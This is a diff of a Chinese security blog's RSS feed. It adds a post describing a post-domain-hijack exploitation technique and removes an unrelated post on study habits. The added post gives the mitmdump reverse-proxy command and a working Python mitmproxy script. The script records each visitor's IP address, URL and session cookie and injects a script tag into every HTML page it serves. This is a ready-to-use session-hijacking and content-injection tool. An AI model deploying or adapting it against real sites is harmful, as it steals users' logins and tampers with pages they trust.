@@ -5,9 +5,78 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 22 May 2018 06:20:31 +0800</pubDate>
-    <lastBuildDate>Tue, 22 May 2018 06:20:31 +0800</lastBuildDate>
+    <pubDate>Tue, 29 May 2018 08:17:41 +0800</pubDate>
+    <lastBuildDate>Tue, 29 May 2018 08:17:41 +0800</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
+    
+      <item>
+        <title>域名劫持后利用脚本</title>
+        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;p&gt;本文记录一种在域名劫持后通过mitmproxy进行http会话劫持的利用脚本,该脚本通过mitmdump的反向代理工作模式进行流量劫持.&lt;/p&gt;
+
+&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
+
+&lt;p&gt;1.通过修改域名的A记录来进行域名劫持
+2.在域名的新A记录主机上安装mitmproxy:&lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install mitmproxy&lt;/code&gt;
+3.在域名的新A记录主机上运行:
+    &lt;code class=&quot;highlighter-rouge&quot;&gt;mitmdump —set allow_remote=true —listen-host 0.0.0.0 -s xdomain.py —mode reverse:http://xxx.xxx.xxx:80 -p 80&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;—listen-host代表本地监听ip
+—mode reverse代表以反向代理的模式进行工作
+—set allow_remote=true代表支持客户端访问的时候是通过代理访问的
+运行时需要需要上面命令中的http://xxx.xxx.xxx:80为目标网站地址,且修改下面代码中的http://xxx.xxx.xxx为目标网站地址
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
+import re
+import chardet
+
+
+def request(flow):
+    # url=flow.request.url
+    # flow.request.headers['User-Agent']='xxx'
+    pass
+
+
+def response(flow):
+    url = flow.request.url
+    print(url)
+    if &quot;http://xxx.xxx.xxx&quot; in url:
+        content = flow.response.content
+        cookie = flow.request.headers['Cookie']
+        ip = str(flow.client_conn.ip_address).split(&quot;:&quot;)[0]
+        bytes_encoding = chardet.detect(content)['encoding']
+        origin_html = content.decode(encoding=bytes_encoding, errors=&quot;ignore&quot;)
+        if &quot;&amp;lt;/html&amp;gt;&quot; in origin_html:
+            insert_xss = '''&amp;lt;script&amp;gt;alert(&quot;you're hacked&quot;)&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;'''
+            new_html = origin_html.replace(&quot;&amp;lt;/html&amp;gt;&quot;, insert_xss)
+            flow.response.text = new_html
+        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
+        with open(&quot;mitm.log&quot;, &quot;a+&quot;) as f:
+            f.write(str(return_value) + &quot;\n&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;[download][1]&lt;/p&gt;
+
+&lt;p&gt;[1]:&lt;/p&gt;
+</description>
+        <pubDate>Tue, 29 May 2018 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</guid>
+        
+        <category>mitmproxy</category>
+        
+        <category>mitmdump</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>炒股</title>
@@ -723,66 +792,6 @@ Out[71]: {'A', 'B', 'C'}
         
         
         <category>二进制</category>
-        
-      </item>
-    
-      <item>
-        <title>高效学习</title>
-        <description>&lt;h3 id=&quot;必读&quot;&gt;必读&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/386f38ef0c13&quot;&gt;从”被动学习”到”主动学习”,只需这一个技巧&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/b061510789f4&quot;&gt;费曼四步学习法vs哈佛大学 “学习吸收率金字塔”&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/learning_pyramid.png&quot; alt=&quot;学习金字塔&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;学习前&quot;&gt;学习前&lt;/h3&gt;
-
-&lt;p&gt;带着问题去学习,为了找到答案而学习.内心拒绝的事不做,做内心想做的事.如果一件事&lt;code class=&quot;highlighter-rouge&quot;&gt;内心不想做&amp;gt;内心想做&lt;/code&gt;,这件事又必须做,则把它变成内心想做的事.例如,此时有时间却不知该学习什么(事先做好学习计划也能让做事变得更内心想做些),于是想想下面2点可做的方向:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;a)有没有什么感兴趣的问题可做的[如对ida怎么脱壳的问题感兴趣],如果有则直接做这件事即可&lt;/li&gt;
-  &lt;li&gt;b)认为此时该做的事情(如学习书籍的知识)比想做的事(如挖浏览器漏洞)更重要时,但是担心自己学习当前书籍[如书籍&lt;code class=&quot;highlighter-rouge&quot;&gt;老码识途&lt;/code&gt;]是&lt;code class=&quot;highlighter-rouge&quot;&gt;内心不想做&amp;gt;内心想做&lt;/code&gt;,但是这件事又必须做,那么找出内心更多想做它的理由,如自己原来就想把它的重要知识点写成博客记录下来,想到这里,内心想做的程度就又比开始更多了,如果此时内心不想做还是大于内心想做,而这件事又是必须做的,则找找其他更多的理由,直到&lt;code class=&quot;highlighter-rouge&quot;&gt;内心想做&amp;gt;内心不想做&lt;/code&gt;.例如:在决定下次组内分享时就分享今天的必须要做的事的内容,这样,内心想做的程度又多了.再如:写下做了这件事情的好处(越多越好)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;小结:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1.做好学习计划&lt;/li&gt;
-  &lt;li&gt;2.直接做想做的事&lt;/li&gt;
-  &lt;li&gt;3.做&lt;code class=&quot;highlighter-rouge&quot;&gt;不想做&amp;gt;想做&lt;/code&gt;的事时要让它变成&lt;code class=&quot;highlighter-rouge&quot;&gt;想做&amp;gt;不想做&lt;/code&gt;,方法为:找出更多想做的理由,直到&lt;code class=&quot;highlighter-rouge&quot;&gt;想做&amp;gt;不想做&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;学习中&quot;&gt;学习中&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1.追究所学知识背后原理&lt;/li&gt;
-  &lt;li&gt;2.抽象出所学具体内容,将它提炼成生成形象的描述&lt;/li&gt;
-  &lt;li&gt;3.提取重点,加以小结&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;学习后&quot;&gt;学习后&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1.分享所学,例如
-    &lt;ul&gt;
-      &lt;li&gt;a.写文章&lt;/li&gt;
-      &lt;li&gt;b.在知乎回答问题&lt;/li&gt;
-      &lt;li&gt;c.假设自己有个学生&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;2.立即应用&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-        <pubDate>Tue, 30 Jan 2018 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/auxilary/2018/01/30/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0/</link>
-        <guid isPermaLink="true">http://localhost:4000/auxilary/2018/01/30/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0/</guid>
-        
-        <category>主动学习</category>
-        
-        
-        <category>auxilary</category>
         
       </item>
     
